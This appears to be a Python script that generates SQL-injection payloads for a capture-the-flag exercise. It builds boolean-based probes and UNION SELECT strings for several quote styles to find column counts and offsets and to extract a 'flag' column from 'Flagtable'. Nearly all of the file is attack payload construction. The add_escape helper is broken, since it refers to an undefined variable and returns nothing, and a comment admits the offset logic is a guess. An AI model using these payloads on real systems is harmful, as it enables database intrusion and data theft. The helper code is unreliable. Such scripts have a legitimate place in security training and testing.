
def add_escape(instr, escape):
	if(esc == "'" or esc == '"'):
		esc + instr + esc


def generate_actions(escapes = None, max_columns = 5):
	actions = []
	if(escapes is None):
		escapes = ['"', "'",""]


	for esc in escapes:
		#Detect vulnerability
		x = "{0} and {0}1{0}={0}1".format(esc) + ("#" if esc == "" else "")
		actions.append(x)
		x = "{0} and {0}1{0}={0}2".format(esc) + ("#" if esc == "" else "")
		actions.append(x)

		#To detect the number of columns and the required offset
		#Columns
		columns = "1"
		for i in range(2,max_columns+2):
			x = "{0} union select {1}#".format(esc, columns)
			actions.append(x)

			#XXX As far as I can tell we put the offset on hold and set it to 2 XXX correct me if this is worng
			x = "{0} union select {1} limit 1 offset 2#".format(esc, columns)
			actions.append(x)


			columns = columns + "," + str(i)

		#To obtain the flag
		columns = "flag"
		for i in range(2, max_columns+2):
			x = "{0} union select {1} from Flagtable limit 1 offset 2#".format(esc, columns)
			actions.append(x)


			columns = columns + ",flag"



	return actions



if __name__ == "__main__":
	print("start")
	actions = generate_actions()

	print("Possible list of actions", len(actions))
	for action in actions:
		print(action)
